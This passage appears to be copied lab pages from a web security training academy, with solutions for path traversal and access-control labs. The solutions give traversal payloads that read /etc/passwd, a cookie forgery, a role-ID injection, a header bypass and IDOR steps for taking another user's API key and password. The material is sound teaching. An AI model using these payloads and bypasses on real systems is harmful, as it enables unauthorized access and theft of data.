        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , traversal sequences stripped non-recursively
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                The application strips path traversal sequences from the user-supplied filename before using it.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/18706d204e31e279885e0113ec3b6474ddaaac7690c0a0dce2b84db0119691fe?referrer=%2fweb-security%2ffile-path-traversal%2flab-sequences-stripped-non-recursively"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, giving it the value:
                                    </p>
                                    <code class="code-scrollable">
        ....//....//....//etc/passwd
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , traversal sequences stripped with superfluous URL-decode
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                The application blocks input containing path traversal sequences. It then performs a URL-decode of the
                input before using it.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/0ff4cb8691cfff7dc5d2c45682d859b9a5c3ba47cb98e42aa05a3391cd0cfc03?referrer=%2fweb-security%2ffile-path-traversal%2flab-superfluous-url-decode"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, giving it the value:
                                    </p>
                                    <code class="code-scrollable">
        ..%252f..%252f..%252fetc/passwd
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , validation of start of path
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                The application transmits the full file path via a request parameter, and validates that the supplied
                path starts with the expected folder.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/7f09a80ec4ca0acdbe9e0fd29231b98a8249b834ac60b8e2b296b470ad0f82a5?referrer=%2fweb-security%2ffile-path-traversal%2flab-validate-start-of-path"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, giving it the value:
                                    </p>
                                    <code class="code-scrollable">
        /var/www/images/../../../etc/passwd
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    File path traversal
                </a>
                , validation of file extension with null byte bypass
                (file-path-traversal)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab contains a
                <a href="https://portswigger.net/web-security/file-path-traversal">
                    path traversal
                </a>
                vulnerability in the display of product images.
            </p>
            <p>
                The application validates that the supplied filename ends with the expected file extension.
            </p>
            <p>
                To solve the lab, retrieve the contents of the
                <code>
   /etc/passwd
  </code>
                file.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/563206d375aae19b45b636fbd08faf36892e8229b2f84d5908110bbdb7798561?referrer=%2fweb-security%2ffile-path-traversal%2flab-validate-file-extension-null-byte-bypass"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Use Burp Suite to intercept and modify a request that fetches a product image.
                                </li>
                                <li>
                                    <p>
                                        Modify the
                                        <code>
         filename
        </code>
                                        parameter, giving it the value:
                                    </p>
                                    <code class="code-scrollable">
        ../../../etc/passwd%00.png
       </code>
                                </li>
                                <li>
                                    Observe that the response contains the contents of the
                                    <code>
        /etc/passwd
       </code>
                                    file.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Unprotected admin functionality
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has an unprotected admin panel.
            </p>
            <p>
                Solve the lab by deleting the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/efb3cd7d563d637400d229d7b4949233047f1b2808b1d46393322d66594a8de2?referrer=%2fweb-security%2faccess-control%2flab-unprotected-admin-functionality"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Go to the lab and view
                                    <code>
        robots.txt
       </code>
                                    by appending
                                    <code>
        /robots.txt
       </code>
                                    to the lab URL. Notice that the
                                    <code>
        Disallow
       </code>
                                    line discloses the path to the admin panel.
                                </li>
                                <li>
                                    In the URL bar, replace
                                    <code>
        /robots.txt
       </code>
                                    with
                                    <code>
        /administrator-panel
       </code>
                                    to load the admin panel.
                                </li>
                                <li>
                                    Delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Unprotected admin functionality with unpredictable URL
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is
                disclosed somewhere in the application.
            </p>
            <p>
                Solve the lab by accessing the admin panel, and using it to delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/878a6a3a7bf5ca38441716313e1ad46697052f36b6c82c4a6bda1a98e28f446f?referrer=%2fweb-security%2faccess-control%2flab-unprotected-admin-functionality-with-unpredictable-url"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Review the lab home page's source using Burp Suite or your web browser's developer
                                    tools.
                                </li>
                                <li>
                                    Observe that it contains some JavaScript that discloses the URL of the admin panel.
                                </li>
                                <li>
                                    Load the admin panel and delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User role controlled by request parameter
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has an admin panel at
                <code>
   /admin
  </code>
                , which identifies administrators using a forgeable cookie.
            </p>
            <p>
                Solve the lab by accessing the admin panel and using it to delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/f97895e072d86380dd3fdd12e2d6ceb6090708b4e3e0cd0990fe741afb553b2e?referrer=%2fweb-security%2faccess-control%2flab-user-role-controlled-by-request-parameter"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Browse to
                                    <code>
        /admin
       </code>
                                    and observe that you can't access the admin panel.
                                </li>
                                <li>
                                    Browse to the login page.
                                </li>
                                <li>
                                    In Burp Proxy, turn interception on and enable response interception.
                                </li>
                                <li>
                                    Complete and submit the login page, and forward the resulting request in Burp.
                                </li>
                                <li>
                                    Observe that the response sets the cookie
                                    <code>
        Admin=false
       </code>
                                    . Change it to
                                    <code>
        Admin=true
       </code>
                                    .
                                </li>
                                <li>
                                    Load the admin panel and delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User role can be modified in user profile
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has an admin panel at
                <code>
   /admin
  </code>
                . It's only accessible to logged-in users with a
                <code>
   roleid
  </code>
                of 2.
            </p>
            <p>
                Solve the lab by accessing the admin panel and using it to delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/703ed76cc046c2c9c06b661c1c25f53f7c1cb238e9b7fa9aff664177fd7c7773?referrer=%2fweb-security%2faccess-control%2flab-user-role-can-be-modified-in-user-profile"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the supplied credentials and access your account page.
                                </li>
                                <li>
                                    Use the provided feature to update the email address associated with your account.
                                </li>
                                <li>
                                    Observe that the response contains your role ID.
                                </li>
                                <li>
                                    Send the email submission request to Burp Repeater, add
                                    <code>
        "roleid":2
       </code>
                                    into the JSON in the request body, and resend it.
                                </li>
                                <li>
                                    Observe that the response shows your
                                    <code>
        roleid
       </code>
                                    has changed to 2.
                                </li>
                                <li>
                                    Browse to
                                    <code>
        /admin
       </code>
                                    and delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User ID controlled by request parameter
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a horizontal privilege escalation vulnerability on the user account page.
            </p>
            <p>
                To solve the lab, obtain the API key for the user
                <code>
   carlos
  </code>
                and submit it as the solution.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/cf2d0a74362ee20a8f6ffb1028e3b44fee9ae125f418ed15832e4a8a2073bff9?referrer=%2fweb-security%2faccess-control%2flab-user-id-controlled-by-request-parameter"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the supplied credentials and go to your account page.
                                </li>
                                <li>
                                    Note that the URL contains your username in the "id" parameter.
                                </li>
                                <li>
                                    Send the request to Burp Repeater.
                                </li>
                                <li>
                                    Change the "id" parameter to
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                                <li>
                                    Retrieve and submit the API key for
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User ID controlled by request parameter, with unpredictable user IDs
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies
                users with GUIDs.
            </p>
            <p>
                To solve the lab, find the GUID for
                <code>
   carlos
  </code>
                , then submit his API key as the solution.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9d95a9e677b81f605d40d00001ffbc8bbb0f0ee73773a3a37727fbde0406b779?referrer=%2fweb-security%2faccess-control%2flab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Find a blog post by
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                                <li>
                                    Click on
                                    <code>
        carlos
       </code>
                                    and observe that the URL contains his user ID. Make a note of this ID.
                                </li>
                                <li>
                                    Log in using the supplied credentials and access your account page.
                                </li>
                                <li>
                                    Change the "id" parameter to the saved user ID.
                                </li>
                                <li>
                                    Retrieve and submit the API key.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User ID controlled by request parameter with data leakage in redirect
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab contains an
                <a href="https://portswigger.net/web-security/access-control">
                    access control
                </a>
                vulnerability where sensitive information is leaked in the body of a redirect response.
            </p>
            <p>
                To solve the lab, obtain the API key for the user
                <code>
   carlos
  </code>
                and submit it as the solution.
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/114de45758e410d7a7458144d568a9c3b78a4be3a14daf61d4e552610739359d?referrer=%2fweb-security%2faccess-control%2flab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the supplied credentials and access your account page.
                                </li>
                                <li>
                                    Send the request to Burp Repeater.
                                </li>
                                <li>
                                    Change the "id" parameter to
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                                <li>
                                    Observe that although the response is now redirecting you to the home page, it has a
                                    body containing the API key belonging to
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                                <li>
                                    Submit the API key.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: User ID controlled by request parameter with password disclosure
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab has user account page that contains the current user's existing password, prefilled in a masked
                input.
            </p>
            <p>
                To solve the lab, retrieve the administrator's password, then use it to delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <p>
                You can log in to your own account using the following credentials:
                <code>
   wiener:peter
  </code>
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9038df39e72961a071967a83c2472bf2edb0ef9595e6f13bd05ce1b2dce81234?referrer=%2fweb-security%2faccess-control%2flab-user-id-controlled-by-request-parameter-with-password-disclosure"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the supplied credentials and access the user account page.
                                </li>
                                <li>
                                    Change the "id" parameter in the URL to
                                    <code>
        administrator
       </code>
                                    .
                                </li>
                                <li>
                                    View the response in Burp and observe that it contains the administrator's password.
                                </li>
                                <li>
                                    Log in to the administrator account and delete
                                    <code>
        carlos
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab:
                <a href="https://portswigger.net/web-security/access-control/idor">
                    Insecure direct object references
                </a>
                (access-control)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-green-small">
                        APPRENTICE
                    </span>
                </p>
            </div>
            <p>
                This lab stores user chat logs directly on the server's file system, and retrieves them using static
                URLs.
            </p>
            <p>
                Solve the lab by finding the password for the user
                <code>
   carlos
  </code>
                , and logging into their account.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/bf6b2f755e63ba10eefdb6633048fc5cf8e4c1d5f386a756fd8e4b6864d70857?referrer=%2fweb-security%2faccess-control%2flab-insecure-direct-object-references"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Select the
                                    <strong>
                                        Live chat
                                    </strong>
                                    tab.
                                </li>
                                <li>
                                    Send a message and then select
                                    <strong>
                                        View transcript
                                    </strong>
                                    .
                                </li>
                                <li>
                                    Review the URL and observe that the transcripts are text files assigned a filename
                                    containing an incrementing number.
                                </li>
                                <li>
                                    Change the filename to
                                    <code>
        1.txt
       </code>
                                    and review the text. Notice a password within the chat transcript.
                                </li>
                                <li>
                                    Return to the main lab page and log in using the stolen credentials.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: URL-based
                <a href="https://portswigger.net/web-security/access-control">
                    access control
                </a>
                can be circumvented
                (access-control)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This website has an unauthenticated admin panel at
                <code>
   /admin
  </code>
                , but a front-end system has been configured to block external access to that path. However, the
                back-end application is built on a framework that supports the
                <code>
   X-Original-URL
  </code>
                header.
            </p>
            <p>
                To solve the lab, access the admin panel and delete the user
                <code>
   carlos
  </code>
                .
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/9955f5350904edabe30089828d2c08ace886493264a0b469354503102379a3e9?referrer=%2fweb-security%2faccess-control%2flab-url-based-access-control-can-be-circumvented"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Try to load
                                    <code>
        /admin
       </code>
                                    and observe that you get blocked. Notice that the response is very plain, suggesting
                                    it may originate from a front-end system.
                                </li>
                                <li>
                                    Send the request to Burp Repeater. Change the URL in the request line to
                                    <code>
        /
       </code>
                                    and add the HTTP header
                                    <code>
        X-Original-URL: /invalid
       </code>
                                    . Observe that the application returns a "not found" response. This indicates that
                                    the back-end system is processing the URL from the
                                    <code>
        X-Original-URL
       </code>
                                    header.
                                </li>
                                <li>
                                    Change the value of the
                                    <code>
        X-Original-URL
       </code>
                                    header to
                                    <code>
        /admin
       </code>
                                    . Observe that you can now access the admin page.
                                </li>
                                <li>
                                    To delete
                                    <code>
        carlos
       </code>
                                    , add
                                    <code>
        ?username=carlos
       </code>
                                    to the real query string, and change the
                                    <code>
        X-Original-URL
       </code>
                                    path to
                                    <code>
        /admin/delete
       </code>
                                    .
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Method-based
                <a href="https://portswigger.net/web-security/access-control">
                    access control
                </a>
                can be circumvented
                (access-control)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab implements
                <a href="https://portswigger.net/web-security/access-control">
                    access controls
                </a>
                based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by
                logging in using the credentials
                <code>
   administrator:admin
  </code>
                .
            </p>
            <p>
                To solve the lab, log in using the credentials
                <code>
   wiener:peter
  </code>
                and exploit the flawed access controls to promote yourself to become an administrator.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/e115e4b43d59771bb787573f305861a795fb30f2447cef9b53618f4232d1c83b?referrer=%2fweb-security%2faccess-control%2flab-method-based-access-control-can-be-circumvented"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the admin credentials.
                                </li>
                                <li>
                                    Browse to the admin panel, promote
                                    <code>
        carlos
       </code>
                                    , and send the HTTP request to Burp Repeater.
                                </li>
                                <li>
                                    Open a private/incognito browser window, and log in with the non-admin credentials.
                                </li>
                                <li>
                                    Attempt to re-promote
                                    <code>
        carlos
       </code>
                                    with the non-admin user by copying that user's session cookie into the existing Burp
                                    Repeater request, and observe that the response says "Unauthorized".
                                </li>
                                <li>
                                    Change the method from
                                    <code>
        POST
       </code>
                                    to
                                    <code>
        POSTX
       </code>
                                    and observe that the response changes to "missing parameter".
                                </li>
                                <li>
                                    Convert the request to use the
                                    <code>
        GET
       </code>
                                    method by right-clicking and selecting "Change request method".
                                </li>
                                <li>
                                    Change the username parameter to your username and resend the request.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Multi-step process with no
                <a href="https://portswigger.net/web-security/access-control">
                    access control
                </a>
                on one step
                (access-control)
            </h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab has an admin panel with a flawed multi-step process for changing a user's role. You can
                familiarize yourself with the admin panel by logging in using the credentials
                <code>
   administrator:admin
  </code>
                .
            </p>
            <p>
                To solve the lab, log in using the credentials
                <code>
   wiener:peter
  </code>
                and exploit the flawed
                <a href="https://portswigger.net/web-security/access-control">
                    access controls
                </a>
                to promote yourself to become an administrator.
            </p>
            <div class="container-buttons-left">
                <a class="button-orange"
                    href="https://portswigger.net/academy/labs/launch/48ea5eff7577d0d5e50c64b5d91f3e2fcc175ebb055c95f30bf8e909f6ba9d2c?referrer=%2fweb-security%2faccess-control%2flab-multi-step-process-with-no-access-control-on-one-step"
                    target="_blank">
                    <span class="icon-erlenmeyer">
                    </span>
                    ACCESS THE LAB
                </a>
            </div>
            <noscript>
                <p class="no-script-lab-warning">
                    Launching labs may take some time, please hold on while we build your environment.
                </p>
            </noscript>
            <div class="component-solution expandable-container">
                <details open>
                    <summary>
                        <h4>
                            <span class="icon-bulb">
                            </span>
                            Solution
                        </h4>
                    </summary>
                    <div class="content">
                        <div>
                            <ol>
                                <li>
                                    Log in using the admin credentials.
                                </li>
                                <li>
                                    Browse to the admin panel, promote
                                    <code>
        carlos
       </code>
                                    , and send the confirmation HTTP request to Burp Repeater.
                                </li>
                                <li>
                                    Open a private/incognito browser window, and log in with the non-admin credentials.
                                </li>
                                <li>
                                    Copy the non-admin user's session cookie into the existing Repeater request, change
                                    the username to yours, and replay it.
                                </li>
                            </ol>
                        </div>
                    </div>
                </details>
            </div>
        </div>
        <hr>
        <div class="section theme-white">
            <h1 class="heading-2">
                Lab: Referer-based access control
                (access-control)</h1>
            <div class="container-columns">
                <p class="widget-container-labelevel">
                    <span class="label-light-blue-small">
                        PRACTITIONER
                    </span>
                </p>
            </div>
            <p>
                This lab controls access to certain admin functionality based on the Referer header. You can familiarize
                yourself with the admin panel by logging in using the credentials
                <code>
   administrator:admin
  </code>
                .
            </p>
            <p>
